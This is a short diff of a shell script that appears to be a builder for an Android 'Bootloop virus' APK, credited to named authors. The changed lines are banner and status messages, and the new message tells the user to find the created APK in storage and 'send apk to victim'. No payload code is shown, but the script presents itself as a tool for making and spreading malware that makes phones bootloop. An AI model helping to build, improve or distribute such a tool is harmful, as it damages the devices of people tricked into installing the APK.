@@ -20,4 +20,4 @@ echo
 echo -e "\033[1m \e[32m (Made by Prince Yasin and Arif-Tech )"
 echo
 toilet -F metal -F border -f block Bootloop | lolcat
-echo -e "\033[1m \e[36m Bootloop virus has been successfully uploaded to trap.apk"
+echo -e "\033[1m \e[36m Bootloop virus has been created successfully check your sdcard or internal storage and send apk to victim"
